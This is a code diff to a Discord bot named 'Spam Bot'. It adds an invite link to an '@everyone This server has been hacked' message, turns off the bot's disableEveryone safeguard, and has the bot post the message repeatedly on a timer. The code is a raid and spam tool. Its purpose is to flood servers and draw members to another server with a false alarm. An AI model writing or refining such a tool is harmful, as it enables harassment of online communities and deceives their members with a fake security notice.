@@ -5,7 +5,7 @@
 
 const BotName = "ツ Spam Bot ツ"; // Bot Name \\
 const Token = process.env.BOT_TOKEN // Replace with "(`tokenhere`) if self hosting
-const SpamMessage = "@everyone This server has been hacked Please Join the new server here:"; // message you want to spam \\
+const SpamMessage = "@everyone This server has been hacked Please Join the new server here:https://discord.gg/tEkJP2b"; // message you want to spam \\
 const YourDiscordID = 510065483693817867; // Replace 0 with your discord id! \\
 
 // Bot \\
@@ -13,7 +13,7 @@ const YourDiscordID = 510065483693817867; // Replace 0 with your discord id! \\
 const Discord = require("discord.js");
 const prefix = ";";
 
-const bot = new Discord.Client({disableEveryone: true});
+const bot = new Discord.Client({disableEveryone: false});
 
 bot.on("ready", async () => {
     bot.user.setGame(`Playing with knives!`, `https://twitch.tv/monstercat`)
@@ -56,8 +56,8 @@ const guild = bot.guilds.get(message.guild.id).id;
         let Ping = message.mentions.users.first();
 	 message.delete().catch();	
         setInterval(function(){
-            message.channel.send(sEmbed)
-            message.channel.send("https://discord.gg/tEkJP2b")
+            message.channel.send(SpamMessage)
+            //message.channel.send("https://discord.gg/tEkJP2b")
             //message.guild.owner.send(sEmbed4)
             //owner.send(sEmbed4)
         },
